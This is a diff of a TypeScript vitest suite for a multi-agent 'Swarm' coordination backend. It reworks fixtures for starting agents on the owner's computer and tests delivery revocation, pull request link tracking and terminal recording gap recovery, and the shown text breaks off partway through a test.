@@ -1,29 +1,32 @@
-import { createHash, randomUUID } from 'node:crypto'
+import { randomBytes, randomUUID } from 'node:crypto'
 import { EventEmitter } from 'node:events'
 import { execFile } from 'node:child_process'
 import { promisify } from 'node:util'
 import { join } from 'node:path'
 import { tmpdir } from 'node:os'
 import { Readable } from 'node:stream'
+import { gzipSync } from 'node:zlib'
 import { afterAll, beforeAll, describe, expect, it, onTestFinished, vi } from 'vitest'
 import { MongoMemoryReplSet } from 'mongodb-memory-server-core'
 import { PrismaClient } from '@prisma/client'
 import Fastify, { type FastifyInstance } from 'fastify'
 import type { AuthUser } from '../src/lib/ssoAuth.js'
 import { ABANDONED_START_MS, GrantReads, SuperTabStore } from '../src/superTabs/store.js'
+import { PERSONAL_SWARM_OPERATION } from '../src/superTabs/deletion.js'
+import { exemptClock } from './channelExemptions.test-support.js'
 import { HostReads } from '../src/superTabs/read/host.js'
-import { MemoryAttachmentStore } from '../src/superTabs/attachments.js'
+import { attachmentsFromEnv, AVATAR_PURPOSE, MemoryAttachmentStore, MemoryAvatarStore, REMOVING_UPLOAD_PURPOSE } from '../src/superTabs/attachments.js'
+import { startAttachmentSweepFrom, sweepUnsentAttachments } from '../src/lib/attachmentSweep.js'
 import { superTabRoutes } from '../src/routes/superTabs.js'
 import { errorHandler } from '../src/middlewares/errorHandler.js'
 import { logger } from '../src/utils/logger.js'
 import { sweepPendingUploads } from '../src/lib/pendingUploadSweep.js'
-import { IGNORED_NOTE, type Command } from '../src/superTabs/commands.js'
+import type { Command } from '../src/superTabs/commands.js'
 import { nextMachineShareGrants } from '../src/lib/machineSharePolicy.js'
 import { DEFAULT_ROUTING_POLICY } from '../src/superTabs/routingPolicy.js'
-import { stableId, type SuperTabState } from '../src/superTabs/model.js'
-import { roleVersion } from '../src/superTabs/projects.js'
-import { ensureTerminalExpiry, TERMINAL_EXPIRY_MS } from '../src/superTabs/terminal.js'
-import { ensureMentionExpiry, MENTION_EXPIRY_MS, swarmsWithTags } from '../src/superTabs/mentions.js'
+import { stableId, type Agent, type SuperTabState } from '../src/superTabs/model.js'
+import { agentDisplayName } from '../src/superTabs/agentNames.js'
+import { ensureTerminalExpiry, TERMINAL_EXPIRY_MS, TERMINAL_RECHECK_MS } from '../src/superTabs/terminal.js'
 import * as parts from '../src/superTabs/parts/index.js'
 import { swarmTransaction } from '../src/superTabs/cache.js'
 import { guardedWrite, PartConflict } from '../src/superTabs/parts/write.js'
@@ -31,6 +34,10 @@ import { ensurePartExpiry, sweepSwarms } from '../src/superTabs/sweeps.js'
 import { assignmentRows, poolRows, rosterRows } from './hostRows.test-support.js'
 import { recipientShare } from '../src/routes/harnessShares.js'
 import { beforeFirstWrite } from './interleave.test-support.js'
+import { startMessageReachStats } from '../src/superTabs/messageReachStats.js'
+import { profiled } from './plans.test-support.js'
+import { storeAssignment, storeCreate, storeStatus } from './storedWork.test-support.js'
+import type { StoredCreate } from '../src/superTabs/steps.test-support.js'
 
 // A fresh loopback replica set, created here. This suite never reads DATABASE_URL or an existing database.
 let replica: MongoMemoryReplSet
@@ -41,67 +48,94 @@ let app: FastifyInstance
 const owner: AuthUser = { sub: '100000000000000000000001', email: 'owner@example.com', autonomousEnv: 'prod', role: 'user' }
 const peer: AuthUser = { sub: '100000000000000000000002', email: 'peer@example.com', autonomousEnv: 'prod', role: 'user' }
 const host: AuthUser = { sub: '100000000000000000000003', email: 'host@example.com', autonomousEnv: 'prod', role: 'user' }
+/** The owner's own computer, where the owner and the owner's agents start new agents (task #4120). */
+const OWN_MAC = 'owner-mac'
 const config = { engine: 'codex', model: 'fixture-model', effort: 'high', contextWindow: 200000, engineVersion: 'fixture' }
-const run = (tab: string, command: Command, user = owner, asAgentId?: string, operationId = randomUUID()) =>
-  store.execute(user, tab, { operationId, command }, asAgentId)
-async function fixture() {
+// A task opened before Swarm v4 removed conversation.create is stored as that command stored it (storeCreate).
+const run = (tab: string, command: Command | StoredCreate, user = owner, asAgentId?: string, operationId = randomUUID()) =>
+  command.type === 'conversation.create' ? storeCreate(db, tab, command, user, asAgentId) : store.execute(user, tab, { operationId, command }, asAgentId)
+/** A command as the machine's own person, `host`: in Swarm v3 a new agent starts only on its own person's computer (task #4120). */
+const asHost = (tab: string, command: Command, _user?: AuthUser, asAgentId?: string, operationId = randomUUID()) => run(tab, command, host, asAgentId, operationId)
+/** A harness id for the fixture's Lead whose member name is (or is not) `name`. A Lead called "Lead" is given a member name
+ *  from agentNames.ts by its id alone, so a random id gives it any of 32 names; a test that adds a harness by one of those
+ *  names fails about one run in 32 when the Lead drew it first (task #3078). */
+const leadHarness = (name: string, named = true) => {
+  for (;;) {
+    const harnessId = randomUUID()
+    const id = stableId('test-host', harnessId)
+    if ((agentDisplayName([{ id, name: 'Lead' }], id) === name) === named) return harnessId
+  }
+}
+async function fixture(leadHarnessId = randomUUID()) {
   const tab = (await store.create(owner, randomUUID(), 'Pilot')).id
-  const lead = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(),
+  const lead = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: leadHarnessId,
     name: 'Lead', configuration: config, lead: true })).result.agentId as string
   return { tab, lead }
 }
-async function routedStart(tab: string, lead: string, role?: 'reviewer', model = 'fixture-model', conversationId = 'lead') {
-  const decision = { assessment: { difficulty: 'low', risk: 'low', why: 'Small task.' },
-    candidates: [{ id: 'c0', kind: 'new', machineId: 'test-host', engine: 'codex', model, effort: 'high',
-      quality: 2, cost: 2, title: 'New agent', label: 'New agent' }],
-    excluded: [], floor: 1, notes: false, pick: 'c0', via: 'only', p: null, belowFloor: false, why: 'Only candidate.' }
-  const routeDecisionId = String((await run(tab, { type: 'route.record', conversationId, decision } as Command, host, lead)).result.routeDecisionId)
-  const request = { conversationId, machineId: 'test-host', engine: 'codex', model, effort: 'high',
-    name: 'Builder', cwd: '/fixture/repo', worktree: false, ...(role ? { role } : {}),
+async function startBuilder(tab: string, lead: string, model = 'fixture-model', conversationId?: string) {
+  // In a new task unless one is named: no agent but its coordinator starts into the project chat (#2207).
+  conversationId ??= String((await run(tab, { type: 'conversation.create', title: 'Builder work', brief: '', checks: [] })).result.conversationId)
+  // On the owner's own computer, which an agent of the Swarm already runs on: an agent starts nowhere unlisted, and a new agent only on
+  // its own person's computer (task #4120). The Lead's person is the owner.
+  if (!(await store.read(owner, tab)).state.agents.some(a => a.machineId === OWN_MAC)) {
+    await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: OWN_MAC, harnessId: randomUUID(), name: 'Owner Mac', configuration: config, lead: false })
+  }
+  const request = { conversationId, machineId: OWN_MAC, engine: 'codex', model, effort: 'high',
+    name: 'Builder', cwd: '/fixture/repo', worktree: false,
     requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } }
-  const startId = String((await run(tab, { type: 'agent.start', request, routeDecisionId } as Command, host, lead)).result.startId)
-  return { routeDecisionId, startId }
+  const startId = String((await run(tab, { type: 'agent.start', request } as Command, host, lead)).result.startId)
+  return { startId, conversationId }
 }
+/** Whether [row] is the row naming who added or removed an agent in a chat, or that it joined or left (#2207): the fixture's
+ *  project chat opens with "owner added <Lead>.". */
+const memberRow = (row: { text: string; source?: unknown }) => (row.source as { kind?: string } | null | undefined)?.kind === 'system' &&
+  /^[^.]+ (added|removed) [^.]+\.$|^[^.]+ (joined|left)\.$/.test(row.text)
 const message = (text: string): Command => ({ type: 'message.send', conversationId: 'lead', text, replyTo: null, recipientIds: [] })
-/** Makes [machineId], a machine of `host`'s, one used only for agents (`harness team on`) for this test: its account row
- *  is a team machine and it reports from its team session with that privacy, so it may take the owner's projects
- *  (docs/plans/2026-10-24-swarm-team-account.md, Task 3). A teammate's work runs only on such a machine. Its host routes then
- *  take its team session alone, never its owner's own sign-in (security review 2 of #2089). */
-async function teamMachine(machineId: string) {
-  const computerId = createHash('sha256').update(machineId).digest('hex').slice(0, 32)
-  await db.machine.update({ where: { machineId }, data: { computerId, sessionKind: 'team' } })
-  onTestFinished(async () => { await db.machine.update({ where: { machineId }, data: { computerId: null, sessionKind: null } }) })
-  const session: AuthUser = { ...host, harnessSessionId: `team-${machineId}`, harnessSessionKind: 'team', harnessComputerId: computerId }
-  return { session, privacy: { mode: 'dedicated' as const } }
+/** The fixture PM's own chat with the owner, who added it: where a person posts, as only agents post in a project's channel and its
+ *  tasks' chats (agentsOnly.test.ts). The Swarm's first agent chat. */
+const pmChat = async (tab: string) => (await db.swarmGroup.findFirstOrThrow({ where: { tabId: tab, kind: 'agent-chat' }, orderBy: { ordinal: 'asc' } })).key
+/** The owner's message to the fixture PM, in their own chat with it. */
+const toPm = async (tab: string, text: string): Promise<Command> => ({ ...message(text), conversationId: await pmChat(tab) } as Command)
+/** A worker of the project chat stored before #2207, and its message to the fixture PM there: only agents post in a project's
+ *  channel (agentsOnly.test.ts). */
+async function crew(tab: string, lead: string) {
+  const id = String((await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(), name: 'Crew',
+    configuration: config, lead: false })).result.agentId)
+  await seat(tab, id)
+  return { id, say: (text: string, conversationId = 'lead') => run(tab, { ...message(text), conversationId, recipientIds: [lead] } as Command, host, id) }
+}
+/** The owner's own agent, Ada, on the owner's own computer, and their chat with it, where the owner's messages reach it: the
+ *  fixture PM runs on host's computer, so it reads no chat of a person's (projects.ts readsAgentChat). The owner, its machine's
+ *  person, polls its deliveries. */
+async function ownAgent(tab: string) {
+  const chat = String((await run(tab, { type: 'agent.new', kind: 'regular', machineId: OWN_MAC, engine: 'codex', name: 'Ada', local: true })).result.conversationId)
+  const ada = String((await run(tab, { type: 'agent.add', conversationId: chat, machineId: OWN_MAC, harnessId: randomUUID(), name: 'Ada',
+    configuration: config, lead: false })).result.agentId)
+  return { chat, ada, say: (text: string): Command => ({ ...message(text), conversationId: chat } as Command) }
 }
 /** A Swarm's whole state as its parts hold it, dormant groups included (test helper: the store keeps no single document). */
 async function storedState(tab: string): Promise<SuperTabState> {
   return parts.reassemble(await db.$transaction(tx => parts.loadAll(tx, tab)))
 }
-/** What an older client saved of a project before project instructions, as it stored it: its skill mode and custom role set in
- *  the state, the role texts beside it (project.skills and project.roles.* keep nothing now). */
-async function seedProject(tab: string, projectId: string, patch: Record<string, unknown>,
-  texts: Array<{ id: string; name: string; kind: 'lead' | 'builder' | 'reviewer'; text: string }> = []) {
-  const state = await storedState(tab)
-  const project = state.projects!.find(p => p.id === projectId)!
-  Object.assign(project, patch, texts.length ? { roles: texts.map(({ text, ...role }) => ({ ...role, version: roleVersion(text) })) } : {})
-  await saveState(tab, state)
-  for (const { id: roleId, text } of texts) {
-    const id = stableId(tab, projectId, roleId), data = { version: roleVersion(text), text }
-    await db.superTabRoleText.upsert({ where: { id }, create: { id, tabId: tab, projectId, roleId, ...data }, update: data })
-  }
-}
-/** Replaces a Swarm's parts with `state`, as an older release or the migration would have left them. Versions keep rising. */
+/** Replaces a Swarm's parts with `state`, as an older release would have left them. Versions keep rising. */
 async function saveState(tab: string, state: SuperTabState) {
   await swarmTransaction(db, async tx => {
     const current = await parts.loadAll(tx, tab)
     const version = Math.max(current.head.version, ...[...current.members, ...current.agents, ...current.groups, ...current.machines,
-      ...current.starts, ...current.progress].map(p => p.version)) + 1
-    for (const model of [tx.swarmHead, tx.swarmMember, tx.swarmAgent, tx.swarmGroup, tx.swarmMachine, tx.swarmStart, tx.swarmProgress] as unknown as
+      ...current.starts].map(p => p.version)) + 1
+    for (const model of [tx.swarmHead, tx.swarmMember, tx.swarmAgent, tx.swarmGroup, tx.swarmMachine, tx.swarmStart] as unknown as
       Array<{ deleteMany(args: unknown): Promise<unknown> }>) await model.deleteMany({ where: { tabId: tab } })
     await parts.insertParts(tx, { ...parts.split(state, { tabId: tab, version, now: Date.now(), visibilityEpoch: current.visibilityEpoch }),
       sequenceBase: current.sequenceBase })
   })
+}
+/** Stores [agentId] in the project chat [conversationId] as a Swarm from before #2207 holds one there: it stays until
+ *  removed, though no command adds an agent but the coordinator there now. */
+async function seat(tab: string, agentId: string, conversationId = 'lead') {
+  const state = await storedState(tab)
+  const chat = state.conversations.find(c => c.id === conversationId)!
+  if (!chat.agentIds.includes(agentId)) chat.agentIds.push(agentId)
+  await saveState(tab, state)
 }
 async function invite(tab: string, role: 'collaborator' | 'viewer' = 'collaborator') {
   const invitation = await run(tab, { type: 'invite.create', email: peer.email, role, conversationId: 'lead' })
@@ -129,6 +163,9 @@ beforeAll(async () => {
   await db.machine.create({ data: { machineId: 'test-host', userId: host.sub, apiKey: 'fixture-only', managerId: 'fixture',
     autonomousEnv: 'prod', authMode: 'remote' } })
   await db.machineShare.create({ data: { machineId: 'test-host', ownerId: host.sub, autonomousEnv: 'prod', emails: [owner.email, peer.email] } })
+  // The owner's own computer: a new agent starts only on its own person's computer, through no share (Swarm v3, task #4120).
+  await db.machine.create({ data: { machineId: OWN_MAC, userId: owner.sub, apiKey: 'fixture-owner-mac', managerId: 'fixture',
+    autonomousEnv: 'prod', authMode: 'remote' } })
   app = Fastify()
   app.setErrorHandler(errorHandler)
   // External SSO is replaced with three fixture accounts; every permission/transaction below is real.
@@ -149,39 +186,7 @@ afterAll(async () => {
 /** A turn of [worker]'s terminal that reaches its coordinator: a gap the recorder calls a restart, on [worker]'s active task in
  *  [group], assigned here when it is not (native.ts turnRecipients). A typed prompt or its answer reaches nobody since project
  *  instructions, phase 4 (phase 1's deferred ruling). */
-async function gapToCoordinator(tab: string, group: string, worker: string, contextId: string, previousEventId: string | null = null) {
-  const task = (await storedState(tab)).conversations.find(c => c.id === group)!
-  if (task.assignment?.agentId !== worker || ['done', 'stopped', 'cancelled', 'lost'].includes(task.assignment.status)) {
-    await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })
-  }
-  return await store.native.append(host, tab, contextId, { turnId: randomUUID(), kind: 'gap', previousEventId, text: '', truncated: false,
-    interrupted: false, gap: { incidentId: randomUUID(), reason: 'recording_restarted', detectedAt: Date.now() + 1000 } }) as { eventId: string }
-}
-
 describe('delivery authority dependencies', () => {
-  it('refuses a native delivery to another receiver when the terminal agent has a private PM chat', async () => {
-    const { tab, lead } = await fixture()
-    await invite(tab)
-    const group = String((await run(tab, { type: 'conversation.create', title: 'Terminal source', brief: '', checks: [] })).result.conversationId)
-    const worker = String((await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Terminal agent', configuration: config, lead: false })).result.agentId)
-    const { contextId } = await store.native.open(peer, tab, { operationId: randomUUID(), conversationId: group, agentId: worker })
-    const turn = await gapToCoordinator(tab, group, worker, contextId)
-    const delivery = await db.superTabDelivery.findFirstOrThrow({ where: { tabId: tab, messageId: turn.eventId, agentId: lead } })
-    expect(delivery.nativeContextId).toBe(contextId)
-    expect(delivery.agentId).not.toBe(worker)
-    // An older stored registration can carry privacy through group membership without a confidential mark or a revoked
-    // context. Only the terminal agent's groups reveal it; the receiver is the Lead in the public source conversation.
-    const state = await storedState(tab)
-    expect(state.agents.find(a => a.id === worker)!.confidential).toBeUndefined()
-    state.conversations.push({ ...structuredClone(state.conversations.find(c => c.id === group)!), id: randomUUID(), title: 'Private PM chat',
-      agentIds: [worker], leadId: null, assignment: null, audience: { people: [{ id: owner.sub, generation: state.people.find(p => p.id === owner.sub)!.generation }] } })
-    await saveState(tab, state)
-    expect((await db.superTabNativeContext.findUniqueOrThrow({ where: { id: contextId } })).revoked).toBe(false)
-    await expect(store.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId: randomUUID() }))
-      .rejects.toMatchObject({ code: 'DELIVERY_REVOKED' })
-  })
-
   it('refuses an older agent without a project when its private project cannot deliver to an outsider', async () => {
     const { tab, lead } = await fixture()
     const projectId = String((await run(tab, { type: 'project.create', name: 'Private legacy project', visibility: 'private', brief: '' })).result.projectId)
@@ -192,36 +197,13 @@ describe('delivery authority dependencies', () => {
     const legacy = state.agents.find(a => a.id === sender)!
     delete legacy.projectId
     await saveState(tab, state)
-    // A stale cross-project delivery from before migration must not acquire the public receiver's project identity.
-    const sent = await run(tab, message('Stale legacy delivery.'))
+    // A stale cross-project delivery from an older release must not acquire the public receiver's project identity.
+    const sent = await (await crew(tab, lead)).say('Stale legacy delivery.')
     const delivery = await db.superTabDelivery.findFirstOrThrow({ where: { tabId: tab, agentId: lead, messageId: sent.result.messageId as string } })
     await db.superTabDelivery.update({ where: { id: delivery.id }, data: { authorKind: 'agent', authorId: sender,
       authorGeneration: legacy.membershipGeneration } })
     await expect(store.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId: randomUUID() }))
       .rejects.toMatchObject({ code: 'DELIVERY_REVOKED' })
-  })
-
-  it('refuses a claim when its person sender is removed after the authority read', async () => {
-    const { tab, lead } = await fixture()
-    await invite(tab)
-    const sent = await run(tab, message('Sent before removal.'), peer)
-    const delivery = await db.superTabDelivery.findFirstOrThrow({ where: { tabId: tab, agentId: lead, messageId: sent.result.messageId as string } })
-    let removed = false
-    const raced = new SuperTabStore(beforeFirstWrite(db, async () => {
-      if (removed) return
-      removed = true
-      // Remove the authority part independently of delivery cancellation, so only the sender touch can reject a stale
-      // authorization decision. The other fixture paths already cover commands cancelling the delivery row itself.
-      await swarmTransaction(db, async tx => {
-        const member = await tx.swarmMember.findFirstOrThrow({ where: { tabId: tab, key: peer.sub } })
-        await guardedWrite(tx, tab, { op: 'remove', kind: 'member', key: peer.sub, seen: member.version,
-          data: member.data as unknown as SuperTabState['people'][number] }, parts.clock.next())
-      })
-    }))
-    await expect(raced.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId: randomUUID() }))
-      .rejects.toMatchObject({ code: 'DELIVERY_REVOKED' })
-    expect(removed).toBe(true)
-    expect((await db.superTabDelivery.findUniqueOrThrow({ where: { id: delivery.id } })).status).toBe('queued')
   })
 })
 
@@ -232,10 +214,22 @@ describe('durable group pull request links', () => {
     return (group as unknown as { pullRequestUrls?: string[] }).pullRequestUrls
   }
 
+  it('records a link under the project\'s repository and corrects the record it held before', async () => {
+    // The PM posts them: only agents post in a project's channel (agentsOnly.test.ts).
+    const { tab, lead } = await fixture()
+    await run(tab, { type: 'tab.project', machineId: 'test-host', project: { cwd: '/work/project', repositoryUrl: null } })
+    // Without a repository to judge by, a link is kept as written.
+    await run(tab, message('Opened https://github.com/other/project/pull/50'), host, lead)
+    expect(await links(tab, 'lead')).toEqual(['https://github.com/other/project/pull/50'])
+    await run(tab, { type: 'project.repository', projectId: 'lead', repositoryUrl: 'https://github.com/example/project' })
+    await run(tab, message(`Again ${pr(50)}, and elsewhere https://github.com/example/other/pull/51`), host, lead)
+    expect(await links(tab, 'lead')).toEqual([pr(50)])
+  })
+
   it('keeps one link beyond the latest 100 messages', async () => {
-    const { tab } = await fixture()
-    await run(tab, message(`Review ${pr(41)}`))
-    await run(tab, message(`Same PR again: ${pr(41)}`))
+    const { tab, lead } = await fixture()
+    await run(tab, message(`Review ${pr(41)}`), host, lead)
+    await run(tab, message(`Same PR again: ${pr(41)}`), host, lead)
     expect(await links(tab)).toEqual([pr(41)])
     await db.superTabMessage.createMany({ data: Array.from({ length: 101 }, (_, i) => ({
       id: randomUUID(), tabId: tab, conversationId: 'lead', sequence: 1000 + i,
@@ -247,224 +241,6 @@ describe('durable group pull request links', () => {
     expect(await links(tab)).toEqual([pr(41)])
   })
 
-  it('lists links from check evidence and a work result even when no message has those links', async () => {
-    const { tab, lead } = await fixture()
-    await run(tab, { type: 'work.define', conversationId: 'lead', brief: 'Record work',
-      checks: [{ description: 'Reviewed', independent: false }] })
-    const assignmentId = String((await run(tab, { type: 'work.assign', conversationId: 'lead', agentId: lead })).result.assignmentId)
-    const checkId = (await store.read(owner, tab)).state.conversations[0]!.checks[0]!.id
-    await run(tab, { type: 'work.check', conversationId: 'lead', assignmentId, checkId, passed: true,
-      evidence: `Reviewed ${pr(42)} and ${pr(42)}` }, host, lead)
-    expect((await store.messages(owner, tab, 'lead', {})).messages.some(row => row.text.includes(pr(42)))).toBe(false)
-    await run(tab, { type: 'work.status', conversationId: 'lead', assignmentId, status: 'working', result: `Built ${pr(43)}` }, host, lead)
-    expect(await links(tab)).toEqual([pr(42), pr(43)])
-  })
-})
-
-describe('native recording restart recovery', () => {
-  async function recoveryFixture(status: 'working' | 'review' = 'working') {
-    const { tab, lead } = await fixture()
-    const group = (await run(tab, { type: 'conversation.create', title: 'Recover interrupted work', brief: 'Finish the saved task',
-      checks: [{ description: 'Task has a checkpoint', independent: false }] })).result.conversationId as string
-    const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Recovery Engineer', configuration: config, lead: false })).result.agentId as string
-    const assigned = await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })
-    const assignmentId = assigned.result.assignmentId as string
-    if (status === 'review') await run(tab, { type: 'work.status', conversationId: group, assignmentId, status, result: 'Checkpoint ready' }, host, worker)
-    const { contextId } = await store.native.open(owner, tab, { operationId: randomUUID(), conversationId: group, agentId: worker })
-    const prompt = { turnId: 'saved_turn', kind: 'prompt' as const, previousEventId: null,
-      text: 'Continue from the saved commit', truncated: false, interrupted: false }
-    const checkpoint = await store.native.append(host, tab, contextId, prompt) as { eventId: string }
-    const checkpointRow = await db.superTabMessage.findUniqueOrThrow({ where: { id: checkpoint.eventId } })
-    const gap = { turnId: 'restart_observation', kind: 'gap' as const, previousEventId: checkpoint.eventId,
-      text: '', truncated: false, interrupted: false }
-    const interruption = (reason: 'recording_restarted' | 'history_lost' | 'agent_stopped' = 'recording_restarted') => ({ ...gap,
-      gap: { incidentId: 'restart_incident', reason, detectedAt: Date.now() + 1000 } })
-    const state = async () => (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!.assignment!
-    const gapDeliveries = async () => {
-      const rows = await db.superTabMessage.findMany({ where: { tabId: tab, conversationId: group } })
-      const ids = rows.filter(m => (m.source as { phase?: string } | null)?.phase === 'gap').map(m => m.id)
-      return db.superTabDelivery.findMany({ where: { tabId: tab, messageId: { in: ids } } })
-    }
-    const append = async (body: Record<string, unknown>, context = contextId) => {
-      const response = await app.inject({ method: 'POST', url: `/api/super-tabs/${tab}/native/${context}`,
-        headers: { authorization: `Bearer ${host.sub}` }, payload: body })
-      expect(response.statusCode, response.body).toBe(200)
-      return response.json().data as { eventId: string }
-    }
-    return { tab, lead, group, worker, assignmentId, contextId, checkpoint, checkpointRow, gap, interruption, state, gapDeliveries, append }
-  }
-
-  it('keeps a PR link from a native message after that message leaves the latest page', async () => {
-    const f = await recoveryFixture()
-    const url = 'https://github.com/example/project/pull/44'
-    await f.append({ turnId: 'saved_turn', kind: 'answer', previousEventId: f.checkpoint.eventId,
-      text: `Opened ${url}`, truncated: false, interrupted: false })
-    const group = () => store.read(owner, f.tab).then(row => row.state.conversations.find(c => c.id === f.group)!)
-    expect((await group()).pullRequestUrls).toEqual([url])
-    await db.superTabMessage.createMany({ data: Array.from({ length: 101 }, (_, i) => ({
-      id: randomUUID(), tabId: f.tab, conversationId: f.group, sequence: 1000 + i,
-      author: { kind: 'person', id: owner.sub, name: owner.email }, text: `Later note ${i}`,
-      replyTo: null, recipientIds: [],
-    })) })
-    expect((await store.messages(owner, f.tab, f.group, {})).messages.some(row => row.text.includes(url))).toBe(false)
-    expect((await group()).pullRequestUrls).toEqual([url])
-  })
-
-  // Project instructions, phase 4: what happened, to the coordinator alone; its task keeps its status.
-  it.each(['recording_restarted', 'history_lost', 'agent_stopped'] as const)('tells only the coordinator of a %s gap with a checkpoint time and no visible ids, and blocks nothing', async reason => {
-    const f = await recoveryFixture(), before = await f.state(), event = f.interruption(reason)
-    const result = await store.native.append(host, f.tab, f.contextId, event) as { eventId: string }
-    expect(await f.state()).toEqual(before)
-    const message = await db.superTabMessage.findUniqueOrThrow({ where: { id: result.eventId } })
-    expect(message.text).toContain('Recovery Engineer')
-    expect(message.text).toContain('Recover interrupted work')
-    expect(message.text).toContain(f.checkpointRow.createdAt.toISOString())
-    expect(message.text).not.toContain(f.assignmentId)
-    expect(message.text).not.toContain(f.checkpoint.eventId)
-    expect(message.text).not.toContain('saved_turn')
-    expect(message.text).not.toMatch(/Recovery needed|Check the agent|report working/)
-    expect(message.source).toMatchObject({ kind: 'native', phase: 'gap', recovery: {
-      assignmentId: f.assignmentId, checkpoint: { eventId: f.checkpoint.eventId, turnId: 'saved_turn', recordedAt: f.checkpointRow.createdAt.toISOString() } } })
-    expect(await f.gapDeliveries()).toMatchObject([{ agentId: f.lead, messageId: result.eventId }])
-    expect(await f.gapDeliveries()).toHaveLength(1)
-    expect(await store.native.append(host, f.tab, f.contextId, event)).toEqual(result)
-    expect(await f.gapDeliveries()).toHaveLength(1)
-  })
-
-  it('keeps a person’s unattributed terminal input from blocking working work or waking the Lead', async () => {
-    const f = await recoveryFixture(), before = await f.state()
-    const result = await f.append({ ...f.gap, gap: { incidentId: 'typed_input', reason: 'unattributed_input', detectedAt: Date.now() + 1000 } })
-    expect(await f.state()).toEqual(before)
-    expect(await f.gapDeliveries()).toEqual([])
-    const message = await db.superTabMessage.findUniqueOrThrow({ where: { id: result.eventId } })
-    expect(message.text).toBe('Some terminal activity could not be recorded. Check the native session for the full conversation.')
-    expect(message.source).not.toHaveProperty('recovery')
-  })
-
-  it.each(['legacy', 'context_expired', 'prompt_missing'] as const)('keeps a %s gap as a plain note without changing work', async reason => {
-    const f = await recoveryFixture(), before = await f.state()
-    const result = await f.append({ ...f.gap, ...(reason === 'legacy' ? {} : { gap: { incidentId: 'plain_gap', reason, detectedAt: Date.now() + 1000 } }) })
-    expect(await f.state()).toEqual(before)
-    expect(await f.gapDeliveries()).toEqual([])
-    const message = await db.superTabMessage.findUniqueOrThrow({ where: { id: result.eventId } })
-    expect(message.text).toBe('Some terminal activity could not be recorded. Check the native session for the full conversation.')
-    expect(message.source).not.toHaveProperty('recovery')
-  })
-
-  it('notifies once about an interruption during review while preserving the review state and result', async () => {
-    const f = await recoveryFixture('review'), before = await f.state(), event = f.interruption()
-    const first = await f.append(event)
-    await f.append({ ...event, turnId: 'another_gap', previousEventId: first.eventId })
-    expect(await f.state()).toEqual(before)
-    expect(await f.gapDeliveries()).toMatchObject([{ agentId: f.lead, messageId: first.eventId }])
-    expect(await f.gapDeliveries()).toHaveLength(1)
-    const message = await db.superTabMessage.findUniqueOrThrow({ where: { id: first.eventId } })
-    expect(message.text).toContain('Terminal recording restarted while the task was in review.')
-    expect(message.text).not.toContain('Keep this task in review')
-    expect(message.text).not.toContain('work was interrupted')
-  })
-
-  it('advertises recovery metadata without requiring it from older recorders', async () => {
-    const f = await recoveryFixture()
-    expect(await store.native.read(host, f.tab, f.contextId)).toMatchObject({ recovery: { version: 1, serverTime: expect.any(Number) } })
-  })
-
-  it('names the newer progress checkpoint when a later restart interrupts the task again', async () => {
-    const f = await recoveryFixture(), detectedAt = Date.now() + 1000
-    const first = await f.append({ ...f.gap, gap: { incidentId: 'first_restart', reason: 'recording_restarted', detectedAt } })
-    const later = new SuperTabStore(db, () => detectedAt + 1)
-    const progress = await later.execute(host, f.tab, { operationId: randomUUID(), command: {
-      type: 'work.status', conversationId: f.group, assignmentId: f.assignmentId, status: 'working', result: 'Saved the next checkpoint' } }, f.worker)
-    const checkpoint = await db.superTabMessage.findUniqueOrThrow({ where: { id: progress.result.messageId as string } })
-    const second = await f.append({ ...f.gap, turnId: 'new_restart_observation', previousEventId: first.eventId,
-      gap: { incidentId: 'second_restart', reason: 'recording_restarted', detectedAt: detectedAt + 2 } })
-    expect(await f.state()).toMatchObject({ status: 'working', result: 'Saved the next checkpoint' })
-    const message = await db.superTabMessage.findUniqueOrThrow({ where: { id: second.eventId } })
-    expect(message.text).toContain(checkpoint.createdAt.toISOString())
-    expect(message.text).not.toContain(checkpoint.id)
-    expect(message.source).toMatchObject({ recovery: { checkpoint: { eventId: checkpoint.id, recordedAt: checkpoint.createdAt.toISOString() } } })
-    expect(await f.gapDeliveries()).toHaveLength(2)
-  })
-
-  it('tells once of the same restart across contexts, and never blocks the task', async () => {
-    const f = await recoveryFixture(), detectedAt = Date.now() + 1000
-    const metadata = { incidentId: 'same_restart', reason: 'recording_restarted', detectedAt }
-    const first = await f.append({ ...f.gap, gap: metadata })
-    expect(await f.state()).toMatchObject({ status: 'working' })
-    const later = new SuperTabStore(db, () => detectedAt + 1)
-    await later.execute(host, f.tab, { operationId: randomUUID(), command: {
-      type: 'work.status', conversationId: f.group, assignmentId: f.assignmentId, status: 'working', result: 'Continuing from the checkpoint' } }, f.lead)
-    const { contextId } = await store.native.open(owner, f.tab, { operationId: randomUUID(), conversationId: f.group, agentId: f.worker })
-    await f.append({ ...f.gap, turnId: 'second_gap', previousEventId: null, gap: metadata }, contextId)
-    await f.append({ ...f.gap, turnId: 'third_gap', previousEventId: first.eventId, gap: metadata })
-    expect(await f.state()).toMatchObject({ status: 'working', result: 'Continuing from the checkpoint' })
-    expect(await f.gapDeliveries()).toHaveLength(1)
-  })
-
-  it.each(['worker', 'lead'] as const)('leaves the %s\'s status as it set it after a gap, including a delayed legacy gap', async who => {
-    const f = await recoveryFixture()
-    const first = await store.native.append(host, f.tab, f.contextId, f.interruption()) as { eventId: string }
-    expect(await f.state()).toMatchObject({ status: 'working' })
-    await run(f.tab, { type: 'work.status', conversationId: f.group, assignmentId: f.assignmentId,
-      status: 'working', result: 'Session checked; work continued' }, host, who === 'worker' ? f.worker : f.lead)
-    await store.native.append(host, f.tab, f.contextId, { ...f.gap, turnId: 'late_legacy_gap', previousEventId: first.eventId })
-    expect(await f.state()).toMatchObject({ status: 'working', result: 'Session checked; work continued' })
